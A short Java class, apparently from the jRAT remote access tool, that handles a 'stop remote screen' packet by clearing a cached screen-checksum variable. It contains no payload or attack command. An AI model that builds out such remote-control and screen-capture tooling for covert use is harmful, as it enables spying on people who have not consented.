package jrat.module.screen;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

public class Packet26StopRemoteScreen implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Screen.prevSums = null;
	}

}
